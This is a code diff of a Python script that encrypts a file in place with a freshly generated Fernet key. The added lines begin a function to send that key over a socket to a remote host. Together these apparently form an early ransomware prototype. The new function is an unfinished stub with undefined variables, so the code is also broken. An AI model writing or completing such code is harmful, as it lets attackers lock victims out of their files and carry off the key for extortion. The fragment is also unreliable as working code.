@@ -1,8 +1,11 @@
+import socket
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric  import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
+
+
 
 symmetricKey = Fernet.generate_key()
 
@@ -33,5 +36,12 @@ with open(filePath, "rb") as file:
 
 with open(filePath, "wb") as file:
     file.write(encrypted_data)
+
+def sendEncryptionKey(eKeyFilePath):
+    with socket.create_connection((hostname,port)) as sock:
+        with open(key_file, "rb") as file:
+            
+            pass
+
 
 quit()
